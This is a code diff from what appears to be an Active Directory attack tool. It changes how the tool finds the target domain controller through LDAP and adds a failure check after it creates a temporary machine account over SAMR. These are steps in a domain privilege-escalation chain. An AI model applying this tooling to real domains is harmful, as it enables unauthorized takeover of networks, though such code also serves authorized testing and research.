@@ -142,25 +142,13 @@ def get_dc_hostname(ldap_session, domain_dumper, options):
         print('[-] Failed retrieving domain info from LDAP')
         exit()
 
-    c_key = 0
-    dcs = list(dcinfo.keys())
-    if len(dcs) > 1:
-        logging.info('We have more than one target, Pls choices the hostname of the -dc-ip you input.')
-        cnt = 0
-        for name in dcs:
-            logging.info(f"{cnt}: {name}")
-            cnt += 1
-        while True:
-            try:
-                c_key = int(input(">>> Your choice: "))
-                if c_key in range(len(dcs)):
-                    break
-            except Exception:
-                pass
-    dc_host = dcs[c_key].lower()
-    dc_fqdn = dcinfo[dcs[c_key]]['dNSHostName'].lower()
-    return dc_host, dc_fqdn
-
+    for host, info in dcinfo.items():
+        if info['HostIP'] == options.dc_ip:
+            print(f'[+] Successfully queried LDAP for matching DC record: {host} {info["dNSHostName"]}')
+            return host, info['dNSHostName']
+    else:
+        print(f'[-] Failed finding DC with matching IP {options.ip}. {dcinfo}')
+        exit()
 
 def create_temp_account(username, password, domain, options, delete=False):
     # Generate temp computer name and password
@@ -176,6 +164,8 @@ def create_temp_account(username, password, domain, options, delete=False):
         computer_name=new_computer_name,
         computer_pass=new_computer_password)
     addmachineaccount.run(delete=delete)
+    if not addmachineaccount._AddComputerSAMR__success:
+        exit()
 
     print(f'[+] Successfully added temporary account: {new_computer_name}:{new_computer_password}')
     return new_computer_name, new_computer_password
